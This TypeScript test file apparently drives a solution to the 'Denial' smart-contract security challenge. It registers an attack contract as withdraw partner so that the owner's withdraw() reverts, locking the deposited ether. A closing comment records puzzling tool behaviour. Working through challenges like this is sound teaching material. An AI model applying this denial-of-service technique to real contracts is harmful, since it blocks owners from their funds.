import { accounts, contract } from '@openzeppelin/test-environment';
const { balance, ether, expectRevert } = require('@openzeppelin/test-helpers');
import assert = require('assert');

// Addresses
const [
    owner, // Contract owner
    attacker, // Attacker
] = accounts;

// Loads contracts
const Denial = contract.fromArtifact('Denial');
const DenialAttack = contract.fromArtifact('DenialAttack');
let denial: any;
let denialAttack: any;

beforeEach(async () => {
    denial = await Denial.new({ from: owner });
    denialAttack = await DenialAttack.new({ from: owner });
});

it('Denial -> deny the owner from withdrawing funds when they call withdraw() (whilst the contract still has funds) ', async () => {

    // Deposit funds into the contract
    await denial.sendTransaction({ from: owner, value: ether('25') });

    const ownerAddress = await denial.owner.call();

    console.log('balance owner A  ', (await balance.current(ownerAddress)).toString());
    console.log('balance attacker ', (await balance.current(attacker)).toString());
    console.log('balance contract ', (await balance.current(denial.address)).toString());

    // Set partner address to contract attacker
    await denial.setWithdrawPartner(denialAttack.address, { from: owner });

    // Withdraw funds
    await expectRevert(
        denial.withdraw({ from: owner }),
        'VM Exception while processing transaction: invalid opcode'
    );

    console.log('---');

    console.log('balance owner A  ', (await balance.current(ownerAddress)).toString());
    console.log('balance attacker ', (await balance.current(attacker)).toString());
    console.log('balance contract ', (await balance.current(denial.address)).toString());
});

/*
    Strange behaviour: it works with Remix or with Truffle using DenialShort.sol, but 
    not working with Denial.sol, which has the same logic !! Truffle issue?
*/
